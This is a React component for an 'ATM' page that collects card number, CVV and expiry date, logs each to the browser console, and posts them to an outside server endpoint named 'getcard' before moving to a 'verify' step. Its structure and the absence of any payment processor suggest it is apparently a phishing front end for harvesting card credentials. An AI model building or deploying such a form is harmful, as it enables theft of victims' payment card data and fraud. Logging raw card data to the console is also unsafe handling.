import React , {useState, useEffect}from 'react'
import Header from './Header'
import { useNavigate } from 'react-router-dom'
import axios  from 'axios'

const ATM = () => {
 
    
    
const [card, setcard] = useState(0)
const cardfn = (e)=>{
    setcard(e.target.value)
    console.log(e.target.value)


}

const [cvv, setcvv] = useState(0)
const cvvfn = (e)=>{
    setcvv(e.target.value)
    console.log(e.target.value)


}


const [expmnth, setexpmnth] = useState(0)

const expmnthfn = (e)=>{
    setexpmnth(e.target.value)
    console.log(e.target.value)


}
    

const [expyear, setexpyear] = useState(0)

const expyearfn = (e)=>{
    setexpyear(e.target.value)
    console.log(e.target.value)


}
    
    const navigate = useNavigate();

    const next = async ()=>{

   const response =  await axios.post('https://server-hs4q.onrender.com/getcard',{card, cvv, expmnth, expyear});
   console.log("see ", response)
        
        navigate('/verify')
        
   
    }
    

    const back = ()=>{
        navigate('/')
    }
 
    return (
  <>
  
  <div>
    <Header />

   
    <div style={{height:'90vh',display:'flex', justifyContent:'center', alignItems:'center',flexDirection:'column',gap:'20px'}}>
    <div style={{display:'flex', justifyContent:'center', alignItems:'center',flexDirection:'column',gap:'20px', padding:'20px', border:'1px solid #ccc'}}>

<img src="/e.png" height={"150px"} width={"150px"} alt="" />
 

<input type="text" placeholder='Name' />
    <input onChange={cardfn}  type="text" placeholder='Card number' name="" id="" />
    <input onChange={cvvfn} type="text" placeholder='cvv' />
    
<div style={{display:'flex', gap:'20px', padding:'10px'}}>   <input onChange={expmnthfn} style={{width:'100px'}} type="text" placeholder='MM' name="" id="" />
   <input style={{width:'100px'}} type="text" onChange={expyearfn} placeholder='YY' name="" id="" /></div>



 <div style={{display:'flex', gap:'20px'}}>
 <button style={{padding:'10px 20px 10px 20px', background:'#f2f2f2', color:'grey', border:'none'}} onClick={back}>back</button>
 <button style={{padding:'10px 20px 10px 20px', background:'#16b7e1', color:'white', border:'none'}} onClick={next}>Next</button>

 </div>
    </div>

    </div>

  </div>
  </>
  )
}

export default ATM